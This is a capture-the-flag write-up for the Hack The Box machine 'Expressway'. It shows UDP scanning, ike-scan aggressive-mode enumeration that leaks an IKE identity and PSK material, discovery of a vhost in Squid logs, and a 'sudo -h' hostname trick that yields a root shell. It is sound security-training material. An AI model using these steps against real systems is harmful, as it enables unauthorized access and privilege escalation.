HTB — Expressway

📅 06/14/2026 · ⏱️ 2 min read · 🎯 Difficulty: Easy
HTBLinuxUDPISAKMPsudo abuse

The Expressway machine features a scenario centered on IPsec/IKE VPNs. Initial access is gained by enumerating the ISAKMP service exposed over UDP and retrieving a PSK. Subsequently, privilege escalation exploits a specific sudo configuration associated with a virtual host.

Reconnaissance

The initial Nmap scan showed only SSH over TCP:

nmap expressway.htb -A

22/tcp open ssh OpenSSH 10.0p2 Debian 8

As there were no other relevant TCP services, UDP enumeration was performed:

nmap expressway.htb -sU --top-ports 100

68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Port 500/UDP indicated the presence of an ISAKMP service used by IPsec/IKE for negotiating secure VPN tunnels.

IKE/IPsec Enumeration

Using ike-scan, the service and its cryptographic parameters were confirmed:

ike-scan -M expressway.htb

SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK)
VID=(XAUTH)
  • Authentication via PSK (Pre-Shared Key).
  • 3DES encryption.
  • SHA1 hashing.
  • Diffie-Hellman Group 2 (1024 bits).
  • XAUTH support.

Next, an aggressive mode enumeration was performed:

ike-scan -P -M -A -n fakeID expressway.htb

The response revealed the identifier:

ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
Finding: The user ike was obtained, along with the material needed to crack the PSK.

Initial access

After retrieving the PSK and completing authentication, it was possible to gain SSH access to the system as the user ike.

Local enumeration

The user's groups were checked:

id

uid=1001(ike) gid=1001(ike)
groups=1001(ike),13(proxy)

The proxy group granted access to directories related to Squid:

find / -group proxy -type d 2>/dev/null

/run/squid
/var/spool/squid
/var/log/squid

An interesting subdomain appeared in the access logs:

cat access.log.1 | grep htb

GET http://offramp.expressway.htb

This revealed the existence of the virtual host offramp.expressway.htb, a key component for privilege escalation.

Privilege escalation

A recent version of sudo was observed during enumeration: 

sudo -V

Sudo version 1.9.17

While investigating hostname-related configurations, the -h parameter was tested, pointing to the previously discovered subdomain: 

sudo -h offramp.expressway.htb -l

The output showed full permissions:

User ike may run the following commands on offramp:
(root) NOPASSWD: ALL
(root) NOPASSWD: ALL
Result: The user could execute any command as root without a password when sudo evaluated the rules for the host offramp.expressway.htb.

Finally:

sudo -h offramp.expressway.htb /bin/bash

This yielded a root-privileged shell.

Conclusion

The attack chain combined IKE/IPsec enumeration, PSK retrieval, access as a valid user, and an insecure hostname-based sudo configuration. The key to the compromise was identifying the hidden subdomain in the Squid logs and using it to trigger full administrative privileges.
